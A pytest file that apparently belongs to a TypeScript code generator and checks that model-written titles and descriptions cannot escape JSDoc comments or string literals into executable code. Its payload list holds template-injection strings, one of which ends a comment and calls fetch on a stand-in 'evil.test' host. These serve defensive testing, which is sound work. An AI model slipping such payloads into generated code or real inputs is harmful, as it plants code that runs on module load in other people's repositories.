"""Template injection — the risk that matters most for a code generator.

MCPForge writes TypeScript into someone else's repository, and the titles and
descriptions in a tool contract are written by a model against a repository we
do not control. Pasted raw, a description ending `*/` closes the JSDoc block and
everything after it executes on module load.

That shipped once. These tests are what keep it closed.
"""

from __future__ import annotations

import re
import shutil
import subprocess
import tempfile
from pathlib import Path
from typing import Any

import pytest

from mcpforge.generation.escaping import as_comment_text, as_json_literal, as_ts_string
from mcpforge.generation.nextjs import generate_patch
from mcpforge.models.webmcp import WebMCPTool, WebMCPToolset

DEMO = Path(__file__).resolve().parents[3] / "fixtures" / "demo-hotel-app"

#: Each of these, placed in a model-authored field, was or could be an escape.
PAYLOADS = [
    '*/ export const EXFIL = fetch("https://evil.test"); /*',
    'says "quoted" text',
    "back`tick and ${expression}",
    "line one\nline two",
    "trailing backslash \\",
    "null\x00byte and \x07bell",
    "*/",
    '"; globalThis.pwned = 1; const x = "',
]


def tool_with(**over: Any) -> WebMCPTool:
    data: dict[str, Any] = {
        "name": "search_rooms",
        "title": "Search rooms",
        "description": "Find rooms.",
        "inputs": [{"name": "guests", "json_type": "integer", "description": "How many"}],
        "output_description": "Rooms.",
        "risk": "READ",
        "approval_required": False,
        "source": {
            "module": "@/lib/rooms",
            "symbol": "searchRooms",
            "call_style": "object",
            "parameters": ["guests"],
        },
        "evidence": [{"path": "src/lib/rooms.ts"}],
    }
    data.update(over)
    return WebMCPTool.model_validate(data)


def generated_source(tool: WebMCPTool) -> str:
    patch = generate_patch(WebMCPToolset(tools=[tool]))
    return next(f for f in patch.files if f.path.endswith("searchRooms.ts")).contents


# -- the escapers themselves ------------------------------------------------


@pytest.mark.parametrize("payload", PAYLOADS)
def test_a_ts_string_literal_cannot_be_broken_out_of(payload: str) -> None:
    import json

    literal = as_ts_string(payload)
    assert literal.startswith('"') and literal.endswith('"')
    # It round-trips, so escaping did not corrupt the value beyond control chars.
    json.loads(literal)


@pytest.mark.parametrize("payload", PAYLOADS)
def test_comment_text_cannot_terminate_the_comment(payload: str) -> None:
    text = as_comment_text(payload)
    assert "*/" not in text
    assert "\n" not in text


def test_comment_text_keeps_the_meaning_visible() -> None:
    """Neutralised, not deleted: the reader should still see what was written."""
    assert as_comment_text("ends with */ here") == "ends with * / here"


def test_a_json_literal_escapes_nested_strings() -> None:
    literal = as_json_literal({"description": "*/ evil(); /*"})
    assert "*/ evil" in literal  # inside a JSON string, which is inert
    assert literal.count('"') >= 4


# -- the generated file -----------------------------------------------------


@pytest.mark.parametrize("payload", PAYLOADS)
def test_a_hostile_description_does_not_become_code(payload: str) -> None:
    source = generated_source(tool_with(description=payload))
    _assert_no_injected_statement(source)


@pytest.mark.parametrize("payload", PAYLOADS)
def test_a_hostile_title_does_not_become_code(payload: str) -> None:
    source = generated_source(tool_with(title=payload))
    _assert_no_injected_statement(source)


@pytest.mark.parametrize("payload", PAYLOADS)
def test_a_hostile_parameter_description_does_not_become_code(payload: str) -> None:
    source = generated_source(
        tool_with(inputs=[{"name": "guests", "json_type": "integer", "description": payload}])
    )
    _assert_no_injected_statement(source)


def code_outside_comments_and_strings(source: str) -> str:
    """Strip block comments, line comments and double-quoted strings.

    Whatever remains is executable code. A payload that survives this is a
    payload the generator let out of its container.
    """
    # Strings first. A schema description legitimately contains `*/`, and
    # stripping comments before strings lets that terminator throw off the
    # comment matching and swallow the very code being looked for — which is
    # how an earlier version of this helper passed on a live injection.
    without_strings = re.sub(r'"(?:[^"\\\n]|\\.)*"', '""', source)
    without_blocks = re.sub(r"/\*.*?\*/", " ", without_strings, flags=re.DOTALL)
    return re.sub(r"//[^\n]*", " ", without_blocks)


def _assert_no_injected_statement(source: str) -> None:
    """The payload must survive only as inert text.

    Comments and string literals are stripped; anything left is code, and none
    of it may come from a model-authored field.
    """
    code = code_outside_comments_and_strings(source)
    for marker in ("EXFIL", "globalThis.pwned", "fetch(", "evil.test"):
        assert marker not in code, f"{marker!r} escaped into executable code:\n{code}"


# -- the ground truth: it still compiles ------------------------------------


@pytest.mark.parametrize("payload", PAYLOADS[:4])
def test_a_hostile_contract_still_produces_a_file_that_compiles(payload: str) -> None:
    """Reading the output is not enough. The compiler is the arbiter.

    Skipped when the workspace has no node_modules, rather than passing on a
    check that did not run.
    """
    tsc = DEMO.parents[1] / "node_modules" / ".bin" / "tsc"
    node_modules = DEMO.parents[1] / "node_modules"
    if not tsc.is_file():
        pytest.skip("node_modules not installed; run npm install to enable this check")

    tool = tool_with(
        title=payload,
        description=payload,
        inputs=[{"name": "guests", "json_type": "integer", "description": payload}],
    )
    patch = generate_patch(WebMCPToolset(tools=[tool]))

    workspace = Path(tempfile.mkdtemp(prefix="mcpforge-inject-"))
    target = workspace / "app"
    try:
        shutil.copytree(DEMO, target, ignore=shutil.ignore_patterns("node_modules", ".next"))
        (target / "node_modules").symlink_to(node_modules)
        for change in patch.files:
            destination = target / change.path
            destination.parent.mkdir(parents=True, exist_ok=True)
            destination.write_text(change.contents)

        result = subprocess.run(  # noqa: S603
            [str(tsc), "--noEmit", "-p", "tsconfig.json"],
            cwd=target,
            capture_output=True,
            text=True,
            timeout=300,
            check=False,
        )
        assert result.returncode == 0, (
            f"a hostile description broke the generated file:\n{result.stdout[-2000:]}"
        )
    finally:
        shutil.rmtree(workspace, ignore_errors=True)
